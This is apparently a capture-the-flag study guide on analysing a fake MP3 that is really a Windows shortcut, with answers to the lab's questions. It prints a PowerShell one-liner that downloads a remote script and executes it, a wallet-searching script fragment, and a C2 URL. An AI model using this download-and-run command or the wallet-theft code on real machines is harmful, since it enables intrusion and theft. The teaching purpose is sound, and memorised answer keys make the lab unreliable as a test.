Day 1 - Maybe SOC-mas music, he thought, doesn't come from a store?
# Malware Investigation & OPSEC Analysis Reference Guide

## Prerequisites & Skills Needed
- Basic understanding of file systems and command line operations
- Knowledge of Windows shortcuts (.lnk files) and PowerShell
- Familiarity with web browsers and GitHub platform
- Understanding of cybersecurity concepts and malware analysis fundamentals

## Tools & Software Required
- **AttackBox** (virtual machine environment)
- **Web browser** for accessing suspicious websites
- **Terminal/Command line interface**
- **ExifTool** (pre-installed for .lnk file analysis)
- **File extraction utilities** (built-in zip extraction)
- **GitHub search functionality**

## Scripts & Code

### PowerShell Command Found in .lnk File
```powershell
-ep Bypass -nop -c "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1','C:\ProgramData\s.ps1'); iex (Get-Content 'C:\ProgramData\s.ps1' -Raw)"
```

### Malicious PowerShell Script Structure
```powershell
function Print-AsciiArt {
    Write-Host "  ____     _       ___  _____    ___    _   _ "
    Write-Host " / ___|   | |     |_ _||_   _|  / __|  | | | |"  
    Write-Host "| |  _    | |      | |   | |   | |     | |_| |"
    Write-Host "| |_| |   | |___   | |   | |   | |__   |  _  |"
    Write-Host " \____|   |_____| |___|  |_|    \___|  |_| |_|"
    Write-Host "         Created by the one and only M.M."
}

# Function to search for wallet files
function Search-ForWallets {
    $walletPaths = @(
        "$env:USERPROFILE\.bitcoin\wallet.dat",
        "$env:USERPROFILE\.ethereum\keystore\*",
        "$env:USERPROFILE\.monero\wallet",
        "$env:USERPROFILE\.dogecoin\wallet.dat"
    )
    # [Additional malicious code for data theft]
}
```

## Filters & Configurations

### File Analysis Settings
- **File command**: Standard Linux utility for identifying file types
- **ExifTool parameters**: Default settings for metadata extraction
- **GitHub search filters**: 
  - Search type: Issues
  - Query format: Exact phrase matching with quotes

### PowerShell Execution Flags
- **-ep Bypass**: Disables PowerShell execution policy restrictions
- **-nop**: Prevents loading of PowerShell profiles
- **-c**: Executes specified command

## Commands & Procedures

### Step 1: Initial Website Investigation
1. Access suspicious website via `MACHINE_IP` in web browser
2. Navigate to About page to identify potential attribution
3. Use YouTube to MP3 conversion feature with test URL: `https://www.youtube.com/watch?v=dQw4w9WgXcQ`

### Step 2: File Extraction and Analysis
```bash
# Navigate to downloads directory
cd /root/

# Extract downloaded zip file
# Right-click → Extract To → Extract

# Analyze first file
file song.mp3

# Analyze suspicious second file
file somg.mp3
```

### Step 3: .lnk File Investigation
```bash
# Use ExifTool to extract metadata and embedded commands
exiftool somg.mp3

# Look for these key fields in output:
# - Relative Path
# - Working Directory  
# - Command Line Arguments
# - Machine ID
```

### Step 4: Source Code Analysis
1. Visit PowerShell script URL in browser: `https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1`
2. Identify unique signatures and strings
3. Extract distinctive identifiers for attribution

### Step 5: GitHub Attribution Search
```
# Search query format
https://github.com/search?q=%22Created+by+the+one+and+only+M.M.%22&type=issues

# Alternative direct access
https://github.com/Bloatware-WarevilleTHM/CryptoWallet-Search/issues/1
```

## Key Data & Metrics

### File Analysis Results
- **song.mp3**: Legitimate audio file (MPEG ADTS, layer III, v1, 192 kbps, 44.1 kHz, Stereo)
- **somg.mp3**: Malicious Windows shortcut (.lnk file) disguised as MP3
- **File creation timestamps**: September 15, 2018, 07:14:14
- **Target file size**: 448,000 bytes
- **Window execution**: Hidden mode

### Malware Capabilities
- **Cryptocurrency wallet theft** (Bitcoin, Ethereum, Monero, Dogecoin)
- **Browser credential harvesting**
- **Remote file download and execution**
- **Data exfiltration to attacker-controlled servers**

### Attribution Indicators
- **Primary signature**: "Created by the one and only M.M."
- **GitHub username**: MM-WarevilleTHM
- **Repository**: Bloatware-WarevilleTHM/CryptoWallet-Search
- **Machine ID**: win-base-2019

## Critical Takeaways

### OPSEC Failure Patterns
- **Username reuse**: Same handles across multiple platforms
- **Distinctive signatures**: Unique strings in code linking to identity
- **Public repository engagement**: GitHub issues and discussions creating attribution trails
- **Metadata preservation**: Device and system information in malware

### Common YouTube Converter Website Risks
- **Malvertising**: Malicious advertisements exploiting system vulnerabilities
- **Phishing schemes**: Fake surveys and offers to steal credentials  
- **Bundled malware**: Hidden malicious executables in downloaded files
- **Social engineering**: Legitimate-looking interfaces masking malicious intent

### Real-World OPSEC Failure Examples
- **AlphaBay Admin**: Email reuse (pimp_alex_91@hotmail.com), real name Bitcoin accounts, username consistency
- **APT1 Group**: Signed malware with nicknames, forum post correlation, predictable patterns, timezone-based attribution

### Investigation Methodology
- **Multi-vector analysis**: Website, file system, metadata, source code
- **Signature tracking**: Unique identifiers across platforms
- **Timeline correlation**: Activity patterns and timestamps
- **Attribution chaining**: Connecting digital personas to real identities

### Key Warning Signs
- **File type mismatch**: Extensions not matching actual file formats
- **Hidden execution**: Scripts designed to run without user awareness  
- **Remote payload delivery**: Downloads from external sources
- **Credential targeting**: Focus on high-value data like cryptocurrency wallets


Looks like the song.mp3 file is not what we expected! Run "exiftool song.mp3" in your terminal to find out the author of the song. Who is the author? 
Answer: Tyler Ramsbey

The malicious PowerShell script sends stolen info to a C2 server. What is the URL of this C2 server?
Answer: http://papash3ll.thm/data

Who is M.M? Maybe his Github profile page would provide clues?
Answer: Mayor Malware

What is the number of commits on the GitHub repo where the issue was raised?
Answer: 1

===================================================

























